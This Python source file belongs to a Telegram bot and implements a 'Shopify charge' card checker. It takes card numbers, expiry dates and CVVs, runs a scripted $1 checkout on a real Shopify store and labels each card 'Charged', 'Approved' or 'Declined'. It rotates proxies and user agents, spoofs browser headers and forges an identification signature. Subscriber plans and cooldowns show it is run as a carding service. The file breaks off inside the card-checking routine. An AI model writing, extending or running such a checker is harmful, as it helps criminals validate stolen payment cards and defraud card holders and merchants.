# BOT/gates/charge/shopify/shopify.py
# Shopify Charge Gateway - CORRECTED with real checkout flow
# Uses meta-app-prod-store-1.myshopify.com

import json
import asyncio
import re
import time
import httpx
import random
import string
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
import os
from urllib.parse import urlparse, parse_qs, urlencode
from BOT.helper.permissions import auth_and_free_restricted
from BOT.helper.start import load_users, save_users

# Import from Admins module for command status
try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False

    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

# Import universal charge processor
try:
    from BOT.gc.credit import charge_processor
except ImportError:
    charge_processor = None

# Import proxy system
try:
    from BOT.tools.proxy import get_proxy_for_user, mark_proxy_success, mark_proxy_failed
    PROXY_ENABLED = True
except ImportError:
    PROXY_ENABLED = False

# Import bin details function
try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return {}

# Enhanced Custom logger with detailed console logging
class ConsoleLogger:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.check_id = f"SHOP-{random.randint(1000, 9999)}"
        self.start_time = None
        self.step_counter = 0
        
    def start_check(self, card_details):
        """Start a new check session"""
        self.start_time = time.time()
        self.step_counter = 0
        cc = card_details.split('|')[0] if '|' in card_details else card_details
        masked_cc = cc[:6] + "******" + cc[-4:] if len(cc) > 10 else cc
        
        print("\n" + "="*80)
        print(f"🛒 [SHOPIFY CHARGE PROCESS STARTED]")
        print(f"   ├── Check ID: {self.check_id}")
        print(f"   ├── User ID: {self.user_id or 'N/A'}")
        print(f"   ├── Card: {masked_cc}")
        print(f"   └── Start Time: {datetime.now().strftime('%H:%M:%S')}")
        print("="*80 + "\n")
    
    def step(self, step_num, step_name, description, status="PROCESSING"):
        """Log a step in the process"""
        self.step_counter += 1
        elapsed = time.time() - self.start_time if self.start_time else 0
        
        status_emoji = {
            "PROCESSING": "🔄",
            "SUCCESS": "✅",
            "FAILED": "❌",
            "WARNING": "⚠️",
            "INFO": "ℹ️"
        }.get(status, "➡️")
        
        print(f"{status_emoji} STEP {step_num:02d}: {step_name}")
        print(f"   ├── Description: {description}")
        print(f"   ├── Elapsed: {elapsed:.2f}s")
        print(f"   └── Timestamp: {datetime.now().strftime('%H:%M:%S.%f')[:-3]}")
        print()
        
        return elapsed
    
    def sub_step(self, step_num, sub_step, description, details=None):
        """Log a sub-step"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        print(f"   │   ├── {step_num}.{sub_step}: {description}")
        if details:
            print(f"   │   │   └── {details}")
    
    def request_details(self, method, url, status_code, response_time, details=None):
        """Log HTTP request details"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        print(f"   │   ├── HTTP {method} {url}")
        print(f"   │   │   ├── Status: {status_code}")
        print(f"   │   │   ├── Response Time: {response_time:.2f}s")
        print(f"   │   │   ├── Total Elapsed: {elapsed:.2f}s")
        if details:
            print(f"   │   │   └── Details: {details}")
    
    def extracted_data(self, data_type, data_value):
        """Log extracted data"""
        print(f"   │   ├── Extracted {data_type}: {data_value}")
    
    def error_detail(self, error_message, error_type="ERROR"):
        """Log error details"""
        error_emoji = "❌" if error_type == "ERROR" else "⚠️"
        print(f"{error_emoji} ERROR DETAIL: {error_message}")
    
    def result(self, success, message, final_status, response_time):
        """Log final result"""
        result_emoji = "✅" if success else "❌"
        result_text = "SUCCESS" if success else "FAILED"
        
        print("\n" + "="*80)
        print(f"{result_emoji} [SHOPIFY CHARGE PROCESS COMPLETED]")
        print(f"   ├── Check ID: {self.check_id}")
        print(f"   ├── Result: {result_text}")
        print(f"   ├── Final Status: {final_status}")
        print(f"   ├── Response: {message[:100]}{'...' if len(message) > 100 else ''}")
        print(f"   ├── Total Steps: {self.step_counter}")
        print(f"   ├── Total Time: {response_time:.2f}s")
        print(f"   └── End Time: {datetime.now().strftime('%H:%M:%S')}")
        print("="*80 + "\n")

# Create global logger instance
logger = ConsoleLogger()

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            config_data = json.load(f)
            return config_data.get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        return users[user_id_str].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False

        with open("DATA/banned_users.txt", "r") as f:
            banned_users = f.read().splitlines()

        return str(user_id) in banned_users
    except:
        return False

def check_cooldown(user_id, command_type="sh"):
    """Check cooldown for user - SKIP FOR OWNER"""
    owner_id = load_owner_id()
    
    # Skip cooldown check for owner
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15)

        if antispam is None:
            antispam = 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0

def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, user_data):
    """Format response exactly like response.py"""
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"

    # Extract user_id from profile
    try:
        user_id = str(user_data.get("user_id", "Unknown"))
    except Exception:
        user_id = None

    # Load gateway from DATA/sites.json
    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        gateway = sites.get(user_id, {}).get("gate", "Shopify Self Site 💷")
    except Exception:
        gateway = "Shopify Self Site 💷"

    # Clean response
    raw_response = str(raw_response) if raw_response else "-"

    # Determine status - FIXED LOGIC
    raw_upper = raw_response.upper()
    
    # Check for REAL successful charges
    if "ORDER_PLACED" in raw_upper or "THANK YOU" in raw_upper or "SUBMITSUCCESS" in raw_upper:
        status_flag = "Charged 💎"
    # Check for OTP/3D Secure
    elif any(keyword in raw_upper for keyword in [
        "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", "3DS"
    ]):
        status_flag = "Approved ❎"
    # Check for address/ZIP issues
    elif any(keyword in raw_upper for keyword in [
        "MISMATCHED", "INCORRECT_ZIP", "INCORRECT_ADDRESS", "ADDRESS_VERIFICATION"
    ]):
        status_flag = "Approved ❎"
    # Check for specific approved but declined scenarios
    elif any(keyword in raw_upper for keyword in [
        "INSUFFICIENT_FUNDS", "INVALID_CVC", "INCORRECT_CVC", 
        "YOUR CARD DOES NOT SUPPORT", "CARD DECLINED"
    ]):
        status_flag = "Declined ❌"
    # Default to declined
    else:
        status_flag = "Declined ❌"

    # BIN lookup
    bin_data = get_bin_details(cc[:6]) or {}
    bin_info = {
        "bin": bin_data.get("bin", cc[:6]),
        "country": bin_data.get("country", "Unknown"),
        "flag": bin_data.get("flag", "🏳️"),
        "vendor": bin_data.get("vendor", "Unknown"),
        "type": bin_data.get("type", "Unknown"),
        "level": bin_data.get("level", "Unknown"),
        "bank": bin_data.get("bank", "Unknown")
    }

    # User Plan
    try:
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎭")
        first_name = user_data.get("first_name", "User")
    except Exception:
        plan = "Free"
        badge = "🎭"
        first_name = "User"

    # Clean name
    clean_name = re.sub(r'[↑←«~∞🏴]', '', first_name).strip()
    profile_display = f"『{badge}』{clean_name}"

    # Final formatted message
    result = f"""
<b>[#Shopify Charge] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{fullcc}</code>
<b>[•] Gateway</b> - <b>{gateway}</b>
<b>[•] Status</b>- <code>{status_flag}</code>
<b>[•] Response</b>- <code>{raw_response}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin</b>: <code>{bin_info['bin']}</code>  
<b>[+] Info</b>: <code>{bin_info['vendor']} - {bin_info['type']} - {bin_info['level']}</code> 
<b>[+] Bank</b>: <code>{bin_info['bank']}</code> 🏦
<b>[+] Country</b>: <code>{bin_info['country']} - [{bin_info['flag']}]</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By</b>: {profile_display} [<code>{plan} {badge}</code>]
<b>[ϟ] Dev</b> ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>Live ⚡️</code>]
"""
    return result

class ShopifyChargeChecker:
    def __init__(self, user_id=None):
        # Modern browser user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ]
        self.user_agent = random.choice(self.user_agents)
        self.base_url = "https://meta-app-prod-store-1.myshopify.com"
        self.product_url = f"{self.base_url}/products/retailer-id-fix-no-mapping"
        self.user_id = user_id
        self.current_proxy = None
        
        # Cookies will be collected from responses
        self.cookies = {}
        self.checkout_token = None
        self.x_checkout_one_session_token = None
        self.x_checkout_web_build_id = "5927fca009d35ac648408d54c8d94b0d54813e89"
        
        # Address information
        self.address = {
            "first_name": "John",
            "last_name": "Doe",
            "address1": "123 Main Street",
            "city": "New York",
            "province": "NY",
            "zip": "10001",
            "country": "US",
            "phone": "5551234567",
            "email": f"john.doe{random.randint(1000, 9999)}@gmail.com"
        }
        
        # Initialize with proxy if available
        if PROXY_ENABLED and user_id:
            self.current_proxy = get_proxy_for_user(user_id, "random")
            if self.current_proxy:
                print(f"🔄 PROXY: Using proxy: {self.current_proxy[:50]}...")
        
        # Initialize console logger
        self.console_logger = ConsoleLogger(user_id)
        
    def get_base_headers(self):
        """Get base headers for browser-like requests"""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Pragma': 'no-cache',
            'Sec-CH-UA': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.user_agent
        }
        
    async def make_request(self, client, method, url, **kwargs):
        """Make request with proxy support and error handling"""
        try:
            # Add headers if not present
            if 'headers' not in kwargs:
                kwargs['headers'] = self.get_base_headers()
            
            # Add timeout if not present
            if 'timeout' not in kwargs:
                kwargs['timeout'] = 30.0
            
            # Add cookies if we have them
            if self.cookies and 'cookies' not in kwargs:
                kwargs['cookies'] = self.cookies
            
            # Make request
            start_time = time.time()
            response = await client.request(method, url, **kwargs)
            response_time = time.time() - start_time
            
            # Update proxy stats if proxy was used
            if self.current_proxy and PROXY_ENABLED:
                if response.status_code < 400:
                    mark_proxy_success(self.current_proxy, response_time)
                else:
                    mark_proxy_failed(self.current_proxy)
            
            # Update cookies from response
            if 'set-cookie' in response.headers:
                cookies_to_update = response.headers.get_list('set-cookie')
                for cookie in cookies_to_update:
                    # Parse cookie
                    if '=' in cookie:
                        name_value = cookie.split(';')[0]
                        if '=' in name_value:
                            name, value = name_value.split('=', 1)
                            self.cookies[name] = value
            
            return response
            
        except Exception as e:
            # Update proxy stats on failure
            if self.current_proxy and PROXY_ENABLED:
                mark_proxy_failed(self.current_proxy)
            print(f"❌ Request error for {url}: {str(e)}")
            raise e
            
    async def human_delay(self, min_delay=1, max_delay=3):
        """Simulate human delay between actions"""
        delay = random.uniform(min_delay, max_delay)
        await asyncio.sleep(delay)
        
    async def load_homepage(self, client):
        """Load homepage to get initial cookies"""
        try:
            elapsed = self.console_logger.step(1, "LOAD HOMEPAGE", "Loading homepage for initial cookies")
            
            response = await self.make_request(
                client, 'GET', self.base_url
            )
            
            self.console_logger.request_details("GET", self.base_url, response.status_code, 
                                              time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code in [200, 304]:
                self.console_logger.sub_step(1, 1, "Homepage loaded successfully")
                # Try to extract some initial data if needed
                html_content = response.text
                # Look for any initial tokens or data
                self.console_logger.step(1, "LOAD HOMEPAGE", "Homepage loaded", "SUCCESS")
                return True
            else:
                self.console_logger.error_detail(f"Failed to load homepage: {response.status_code}")
                return False
                
        except Exception as e:
            self.console_logger.error_detail(f"Homepage error: {str(e)}")
            return False
        
    async def load_product_page(self, client):
        """Load product page to view product"""
        try:
            elapsed = self.console_logger.step(2, "LOAD PRODUCT PAGE", "Loading product page")
            
            response = await self.make_request(
                client, 'GET', self.product_url
            )
            
            self.console_logger.request_details("GET", self.product_url, response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code in [200, 304]:
                html_content = response.text
                
                # Try to extract product variant ID
                variant_patterns = [
                    r'data-product-id="(\d+)"',
                    r'product_id["\']?\s*:\s*["\']?(\d+)',
                    r'variant_id["\']?\s*:\s*["\']?(\d+)',
                ]
                
                for pattern in variant_patterns:
                    match = re.search(pattern, html_content)
                    if match:
                        variant_id = match.group(1)
                        self.console_logger.extracted_data("Product Variant ID", variant_id)
                        break
                
                self.console_logger.sub_step(2, 1, "Product page loaded successfully")
                self.console_logger.step(2, "LOAD PRODUCT PAGE", "Product page loaded", "SUCCESS")
                return True
            else:
                self.console_logger.error_detail(f"Failed to load product page: {response.status_code}")
                return False
                
        except Exception as e:
            self.console_logger.error_detail(f"Product page error: {str(e)}")
            return False
            
    async def add_to_cart(self, client):
        """Add product to cart"""
        try:
            elapsed = self.console_logger.step(3, "ADD TO CART", "Adding product to cart")
            
            # Use the standard Shopify add to cart endpoint
            add_to_cart_url = f"{self.base_url}/cart/add.js"
            
            headers = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': self.base_url,
                'Referer': self.product_url,
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': self.user_agent
            }
            
            # Data for adding to cart (quantity 1 of default product)
            data = {
                'items': json.dumps([{
                    'id': 42974272290658,  # Default variant ID
                    'quantity': 1
                }])
            }
            
            response = await client.post(
                add_to_cart_url,
                headers=headers,
                data=data,
                cookies=self.cookies,
                timeout=30.0
            )
            
            self.console_logger.request_details("POST", add_to_cart_url, response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed),
                                              f"Data: {data}")
            
            if response.status_code == 200:
                self.console_logger.sub_step(3, 1, "Product added to cart successfully")
                self.console_logger.step(3, "ADD TO CART", "Product added to cart", "SUCCESS")
                return True
            else:
                # Try alternative method
                self.console_logger.sub_step(3, 1, "Trying alternative cart method...")
                
                # Try direct POST to /cart with form data
                alt_data = {
                    'quantity': '1',
                    'id': '42974272290658'
                }
                
                alt_response = await client.post(
                    f"{self.base_url}/cart/add",
                    headers={
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': self.base_url,
                        'Referer': self.product_url,
                        'User-Agent': self.user_agent
                    },
                    data=alt_data,
                    cookies=self.cookies,
                    timeout=30.0
                )
                
                if alt_response.status_code in [200, 302]:
                    self.console_logger.sub_step(3, 2, "Alternative method succeeded")
                    return True
                else:
                    self.console_logger.error_detail(f"Failed to add to cart: {response.status_code}")
                    return False
                
        except Exception as e:
            self.console_logger.error_detail(f"Add to cart error: {str(e)}")
            return False
            
    async def go_to_checkout(self, client):
        """Go to checkout page"""
        try:
            elapsed = self.console_logger.step(4, "GO TO CHECKOUT", "Redirecting to checkout")
            
            # First visit cart page
            cart_response = await self.make_request(
                client, 'GET', f"{self.base_url}/cart"
            )
            
            if cart_response.status_code != 200:
                self.console_logger.error_detail(f"Failed to load cart page: {cart_response.status_code}")
                return False, "Failed to load cart"
            
            # Extract checkout URL from cart page or create it
            checkout_url = f"{self.base_url}/checkout"
            
            # Visit checkout page
            response = await self.make_request(
                client, 'GET', checkout_url
            )
            
            self.console_logger.request_details("GET", checkout_url, response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code in [200, 302]:
                # Check if we were redirected to a specific checkout URL
                final_url = str(response.url)
                
                # Extract checkout token from URL if present
                if '/checkouts/' in final_url:
                    match = re.search(r'/checkouts/([^/]+)', final_url)
                    if match:
                        self.checkout_token = match.group(1)
                        self.console_logger.extracted_data("Checkout Token", self.checkout_token)
                
                self.console_logger.sub_step(4, 1, f"Checkout page loaded: {final_url[:80]}")
                self.console_logger.step(4, "GO TO CHECKOUT", "Checkout page loaded", "SUCCESS")
                return True, final_url
            else:
                self.console_logger.error_detail(f"Failed to load checkout: {response.status_code}")
                return False, f"Checkout failed: {response.status_code}"
                
        except Exception as e:
            self.console_logger.error_detail(f"Checkout error: {str(e)}")
            return False, f"Checkout error: {str(e)}"
            
    async def extract_checkout_tokens(self, client, checkout_url):
        """Extract tokens from checkout page"""
        try:
            elapsed = self.console_logger.step(5, "EXTRACT TOKENS", "Extracting checkout tokens")
            
            # Load checkout page with specific parameters
            parsed_url = urlparse(checkout_url)
            query_params = parse_qs(parsed_url.query)
            
            # Add skip_shop_pay parameter
            query_params['skip_shop_pay'] = ['true']
            
            # Reconstruct URL
            new_query = urlencode(query_params, doseq=True)
            final_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            response = await self.make_request(
                client, 'GET', final_url
            )
            
            self.console_logger.request_details("GET", final_url, response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code == 200:
                html_content = response.text
                
                # Extract session token
                session_token_patterns = [
                    r'"sessionToken":"([^"]+)"',
                    r'sessionToken["\']?\s*:\s*["\']([^"\']+)',
                    r'x-checkout-one-session-token["\']?\s*:\s*["\']([^"\']+)'
                ]
                
                for pattern in session_token_patterns:
                    match = re.search(pattern, html_content)
                    if match:
                        self.x_checkout_one_session_token = match.group(1)
                        self.console_logger.extracted_data("Session Token", f"{self.x_checkout_one_session_token[:30]}...")
                        break
                
                # Extract other important data
                # Look for web build ID
                web_build_pattern = r'"sha":"([^"]+)"'
                web_match = re.search(web_build_pattern, html_content)
                if web_match:
                    self.x_checkout_web_build_id = web_match.group(1)
                    self.console_logger.extracted_data("Web Build ID", self.x_checkout_web_build_id)
                
                # Generate session token if not found
                if not self.x_checkout_one_session_token:
                    self.x_checkout_one_session_token = self.generate_session_token()
                    self.console_logger.sub_step(5, 1, "Generated session token")
                
                self.console_logger.step(5, "EXTRACT TOKENS", "Tokens extracted", "SUCCESS")
                return True
            else:
                self.console_logger.error_detail(f"Failed to extract tokens: {response.status_code}")
                return False
                
        except Exception as e:
            self.console_logger.error_detail(f"Token extraction error: {str(e)}")
            return False
            
    async def create_payment_session(self, client, cc, mes, ano, cvv):
        """Create payment session with Shopify PCI"""
        try:
            elapsed = self.console_logger.step(6, "CREATE PAYMENT SESSION", "Creating payment session")
            
            domain = urlparse(self.base_url).netloc
            
            # Headers from actual browser request
            headers = {
                'authority': 'checkout.pci.shopifyinc.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://checkout.pci.shopifyinc.com',
                'referer': 'https://checkout.pci.shopifyinc.com/',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': self.user_agent,
                'shopify-identification-signature': self.generate_shopify_signature()
            }
            
            json_data = {
                'credit_card': {
                    'number': cc.replace(' ', ''),
                    'month': mes,
                    'year': ano,
                    'verification_value': cvv,
                    'name': f"{self.address['first_name']} {self.address['last_name']}",
                },
                'payment_session_scope': domain
            }
            
            # Use separate client for PCI endpoint
            async with httpx.AsyncClient(timeout=30.0) as pci_client:
                response = await pci_client.post(
                    'https://checkout.pci.shopifyinc.com/sessions',
                    headers=headers,
                    json=json_data,
                    timeout=30.0
                )
            
            self.console_logger.request_details("POST", 'https://checkout.pci.shopifyinc.com/sessions',
                                              response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code == 200:
                data = response.json()
                session_id = data.get("id", "")
                if session_id:
                    self.console_logger.extracted_data("Payment Session ID", f"{session_id[:30]}...")
                    self.console_logger.step(6, "CREATE PAYMENT SESSION", "Payment session created", "SUCCESS")
                    return True, session_id
                else:
                    self.console_logger.error_detail("No session ID in response")
                    return False, "No payment session ID"
            else:
                error_msg = "Payment session creation failed"
                try:
                    error_data = response.json()
                    if "error" in error_data:
                        error_msg = error_data.get("error", {}).get("message", error_msg)
                except:
                    pass
                
                # Check for specific card errors
                error_msg_lower = error_msg.lower()
                if "declined" in error_msg_lower:
                    error_msg = "Card Declined"
                elif "cvc" in error_msg_lower:
                    error_msg = "Invalid CVC"
                elif "expired" in error_msg_lower:
                    error_msg = "Expired Card"
                elif "funds" in error_msg_lower:
                    error_msg = "Insufficient Funds"
                
                self.console_logger.error_detail(f"Payment session failed: {response.status_code} - {error_msg}")
                return False, error_msg
                
        except Exception as e:
            self.console_logger.error_detail(f"Payment session error: {str(e)}")
            return False, f"Payment error: {str(e)[:80]}"
            
    async def submit_payment(self, client, session_id):
        """Submit payment to complete checkout"""
        try:
            elapsed = self.console_logger.step(7, "SUBMIT PAYMENT", "Submitting payment")
            
            if not self.checkout_token or not self.x_checkout_one_session_token:
                return False, "Missing checkout tokens"
            
            # Headers for GraphQL request
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US',
                'content-type': 'application/json',
                'origin': self.base_url,
                'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
                'user-agent': self.user_agent,
                'x-checkout-one-session-token': self.x_checkout_one_session_token,
                'x-checkout-web-build-id': self.x_checkout_web_build_id,
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-server-rendering': 'yes',
                'x-checkout-web-source-id': self.checkout_token
            }
            
            # SIMPLIFIED GraphQL payload based on actual Shopify flow
            json_data = {
                "operationName": "SubmitForCompletion",
                "variables": {
                    "input": {
                        "sessionInput": {
                            "sessionToken": self.x_checkout_one_session_token,
                        },
                        "discounts": {
                            "lines": [],
                            "acceptUnexpectedDiscounts": True,
                        },
                        "delivery": {
                            "deliveryLines": [
                                {
                                    "destination": {
                                        "streetAddress": {
                                            "address1": self.address["address1"],
                                            "city": self.address["city"],
                                            "countryCode": self.address["country"],
                                            "postalCode": self.address["zip"],
                                            "firstName": self.address["first_name"],
                                            "lastName": self.address["last_name"],
                                            "zoneCode": self.address["province"],
                                            "phone": self.address["phone"],
                                        },
                                    },
                                    "selectedDeliveryStrategy": {
                                        "deliveryStrategyMatchingConditions": {
                                            "estimatedTimeInTransit": {"any": True},
                                            "shipments": {"any": True},
                                        },
                                    },
                                    "targetMerchandiseLines": {
                                        "lines": [
                                            {"stableId": "default"},
                                        ],
                                    },
                                    "deliveryMethodTypes": ["SHIPPING"],
                                },
                            ],
                        },
                        "merchandise": {
                            "merchandiseLines": [
                                {
                                    "stableId": "default",
                                    "merchandise": {
                                        "productVariantReference": {
                                            "id": "gid://shopify/ProductVariantMerchandise/42974272290658",
                                            "variantId": "gid://shopify/ProductVariant/42974272290658",
                                        },
                                    },
                                    "quantity": {"items": {"value": 1}},
                                    "expectedTotalPrice": {
                                        "value": {
                                            "amount": "1.00",
                                            "currencyCode": "USD",
                                        },
                                    },
                                },
                            ],
                        },
                        "payment": {
                            "paymentLines": [
                                {
                                    "paymentMethod": {
                                        "directPaymentMethod": {
                                            "paymentMethodIdentifier": "shopify_payments",
                                            "sessionId": session_id,
                                            "billingAddress": {
                                                "streetAddress": {
                                                    "address1": self.address["address1"],
                                                    "city": self.address["city"],
                                                    "countryCode": self.address["country"],
                                                    "postalCode": self.address["zip"],
                                                    "firstName": self.address["first_name"],
                                                    "lastName": self.address["last_name"],
                                                    "zoneCode": self.address["province"],
                                                    "phone": self.address["phone"],
                                                },
                                            },
                                        },
                                    },
                                    "amount": {
                                        "value": {
                                            "amount": "1.00",
                                            "currencyCode": "USD",
                                        },
                                    },
                                },
                            ],
                        },
                        "buyerIdentity": {
                            "customer": {
                                "presentmentCurrency": "USD",
                                "countryCode": self.address["country"],
                            },
                            "email": self.address["email"],
                            "phoneCountryCode": "US",
                        },
                        "taxes": {
                            "proposedTotalAmount": {
                                "value": {
                                    "amount": "0.00",
                                    "currencyCode": "USD",
                                },
                            },
                        },
                    },
                    "attemptToken": f"{self.checkout_token}-{random.randint(1000, 9999)}",
                    "analytics": {
                        "requestUrl": f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us",
                    },
                },
                "query": "mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!, $analytics: AnalyticsInput) { submitForCompletion(input: $input, attemptToken: $attemptToken, analytics: $analytics) { ... on SubmitSuccess { receipt { id } } ... on SubmitAlreadyAccepted { receipt { id } } ... on SubmitFailed { reason } ... on SubmitRejected { errors { ... on NegotiationError { code localizedMessage } } } ... on Throttled { pollAfter pollUrl queueToken } } }",
            }
            
            response = await client.post(
                f'{self.base_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion',
                headers=headers,
                json=json_data,
                timeout=30.0
            )
            
            self.console_logger.request_details("POST", 
                f'{self.base_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion',
                response.status_code,
                time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code == 200:
                data = response.json()
                
                # Parse response
                success, message = self.parse_payment_response(data)
                
                if success:
                    self.console_logger.step(7, "SUBMIT PAYMENT", "Payment successful", "SUCCESS")
                else:
                    self.console_logger.step(7, "SUBMIT PAYMENT", "Payment failed", "FAILED")
                
                return success, message
                    
            else:
                error_text = response.text[:200]
                self.console_logger.error_detail(f"Submit payment failed: {response.status_code} - {error_text}")
                
                # Try to extract error message
                try:
                    error_data = response.json()
                    if 'errors' in error_data:
                        error_msg = error_data['errors'][0].get('message', 'Payment failed')
                    else:
                        error_msg = f"HTTP {response.status_code}"
                except:
                    error_msg = f"HTTP {response.status_code}"
                
                return False, error_msg
                
        except Exception as e:
            self.console_logger.error_detail(f"Submit payment error: {str(e)}")
            return False, f"Payment error: {str(e)[:80]}"
            
    def parse_payment_response(self, data):
        """Parse payment response"""
        try:
            if not isinstance(data, dict):
                return False, "Invalid response format"
            
            # Check for GraphQL errors
            if 'errors' in data:
                errors = data['errors']
                if errors:
                    error_msg = errors[0].get('message', 'Payment failed')
                    return False, error_msg
            
            # Check for success in data
            submit_data = data.get('data', {}).get('submitForCompletion', {})
            
            if submit_data.get('__typename') == 'SubmitSuccess':
                return True, "ORDER_PLACED - Payment Successful"
            elif submit_data.get('__typename') == 'SubmitAlreadyAccepted':
                return True, "ORDER_ALREADY_ACCEPTED - Payment Successful"
            elif submit_data.get('__typename') == 'SubmitFailed':
                reason = submit_data.get('reason', 'Payment failed')
                return False, reason
            elif submit_data.get('__typename') == 'SubmitRejected':
                errors = submit_data.get('errors', [])
                if errors:
                    error_msg = errors[0].get('localizedMessage', 'Payment rejected')
                    return False, error_msg
            
            return False, "Payment declined - Unknown reason"
            
        except Exception as e:
            return False, f"Response error: {str(e)[:50]}"
            
    def generate_session_token(self):
        """Generate random session token"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(64))
    
    def generate_shopify_signature(self):
        """Generate Shopify identification signature"""
        # Simplified signature generation
        chars = string.ascii_letters + string.digits + ".-_"
        parts = []
        for _ in range(3):
            part = ''.join(random.choice(chars) for _ in range(50))
            parts.append(part)
        return '.'.join(parts)
        
    async def check_card(self, card_details, username, user_data):
        """Main card checking method"""
        start_time = time.time()
        
        # Initialize console logger for this check
        self.console_logger = ConsoleLogger(self.user_id)
        self.console_logger.start_check(card_details)
        
        try:
            # Parse card details
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid card format", "ERROR", elapsed_time)
                return format_shopify_response("", "", "", "", "Invalid card format. Use: CC|MM|YY|CVV", elapsed_time, username, user_data)

            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            # Validate card details
